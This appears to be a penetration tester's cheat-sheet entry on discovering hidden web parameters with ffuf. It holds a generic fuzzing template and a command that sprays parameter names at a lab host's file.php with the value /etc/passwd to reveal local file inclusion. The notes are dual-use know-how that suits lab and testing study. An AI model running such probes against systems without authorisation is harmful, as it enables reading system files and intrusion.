-- -
Hunting down parameter names and values, mostly for the lists that are useful but how to do it as well. 
### ffuf
```bash
# general 
ffuf  -u <url>/<file>?FUZZ=<value> -w <path to wordlist> -fs <exclude response siz> 

# simple and reveals LFI (potentially RFI) exploit
ffuf -u http://192.168.138.80/console/file.php?FUZZ=/etc/passwd -w seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```